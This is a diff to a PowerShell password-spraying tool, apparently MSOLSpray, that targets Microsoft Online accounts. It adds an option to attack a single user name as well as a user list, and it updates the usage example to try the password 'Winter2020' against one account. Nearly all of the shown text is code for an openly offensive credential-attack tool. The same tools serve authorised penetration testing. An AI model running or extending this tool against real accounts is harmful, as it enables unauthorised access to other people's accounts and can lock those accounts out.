@@ -17,6 +17,10 @@ function Invoke-MSOLSpray{
         
         UserList file filled with usernames one-per-line in the format "user@domain.com"
     
+    .PARAMETER UserName
+
+        A single user to spray in the format "user@domain.com".
+
     .PARAMETER Password
         
         A single password that will be used to perform the password spray.
@@ -39,10 +43,10 @@ function Invoke-MSOLSpray{
     
     .EXAMPLE
         
-        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+        C:\PS> Invoke-MSOLSpray -UserName user@company.com -Password Winter2020
         Description
         -----------
-        This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
+        This command will use the provided username and attempt to authenticate to with a password of Winter2020.
     
     .EXAMPLE
         
@@ -64,9 +68,13 @@ function Invoke-MSOLSpray{
 
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
+    $UserName = "",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
     $Password = "",
 
-    [Parameter(Position = 2, Mandatory = $False)]
+    [Parameter(Position = 4, Mandatory = $False)]
     [Int]
     $Delay = 10,
 
@@ -81,7 +89,12 @@ function Invoke-MSOLSpray{
   )
     
     $ErrorActionPreference= 'silentlycontinue'
-    $Usernames = Get-Content $UserList
+    
+    if ($UserName -ne "") {
+        $Usernames = $UserName
+    } else {
+        $Usernames = Get-Content $UserList
+    }
     $count = $Usernames.count
     $curr_user = 0
     $lockout_count = 0
